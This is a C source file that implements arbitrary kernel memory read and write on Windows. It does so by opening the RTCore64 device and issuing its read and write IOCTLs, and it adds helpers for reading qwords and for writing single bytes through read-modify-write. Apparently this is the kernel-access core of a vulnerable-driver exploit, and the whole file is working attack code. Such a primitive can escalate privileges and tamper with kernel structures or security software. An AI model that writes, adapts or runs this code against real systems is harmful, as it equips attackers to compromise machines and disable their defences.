/*
 * km_rw.c — RTCore64 kernel R/W implementation
 */

#include "km_rw.h"
#include <stdio.h>

static HANDLE g_dev = INVALID_HANDLE_VALUE;

bool KmRw_Init(void)
{
    g_dev = CreateFileA(
        RTCORE64_DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (g_dev == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[km_rw] CreateFile failed: %lu\n", GetLastError());
        return false;
    }
    return true;
}

void KmRw_Close(void)
{
    if (g_dev != INVALID_HANDLE_VALUE) {
        CloseHandle(g_dev);
        g_dev = INVALID_HANDLE_VALUE;
    }
}

bool KmRw_ReadDword(uint64_t addr, uint32_t *out)
{
    RTCore64ReadReq req = {0};
    req.address   = addr;
    req.read_size = 4;

    DWORD returned = 0;
    if (!DeviceIoControl(g_dev, RTCORE64_IOCTL_READ_MEM,
        &req, sizeof(req), &req, sizeof(req), &returned, NULL))
    {
        fprintf(stderr, "[km_rw] ReadDword IOCTL failed: %lu\n", GetLastError());
        return false;
    }
    *out = req.value;
    return true;
}

bool KmRw_ReadQword(uint64_t addr, uint64_t *out)
{
    /* Read as two DWORDs (RTCore64 max single read is 4 bytes) */
    uint32_t lo = 0, hi = 0;
    if (!KmRw_ReadDword(addr, &lo))     return false;
    if (!KmRw_ReadDword(addr + 4, &hi)) return false;
    *out = ((uint64_t)hi << 32) | lo;
    return true;
}

bool KmRw_WriteDword(uint64_t addr, uint32_t val)
{
    RTCore64WriteReq req = {0};
    req.address    = addr;
    req.write_size = 4;
    req.value      = val;

    DWORD returned = 0;
    if (!DeviceIoControl(g_dev, RTCORE64_IOCTL_WRITE_MEM,
        &req, sizeof(req), &req, sizeof(req), &returned, NULL))
    {
        fprintf(stderr, "[km_rw] WriteDword IOCTL failed: %lu\n", GetLastError());
        return false;
    }
    return true;
}

bool KmRw_WriteByte(uint64_t addr, uint8_t val)
{
    /*
     * RTCore64 minimum write unit is a DWORD. To write a single byte we:
     * 1. Read the surrounding DWORD
     * 2. Mask in the new byte at the correct offset
     * 3. Write the modified DWORD back
     */
    uint64_t aligned = addr & ~3ULL;
    uint32_t shift   = (uint32_t)((addr & 3) * 8);

    uint32_t dw = 0;
    if (!KmRw_ReadDword(aligned, &dw)) return false;

    dw &= ~(0xFFu << shift);
    dw |= ((uint32_t)val << shift);

    return KmRw_WriteDword(aligned, dw);
}
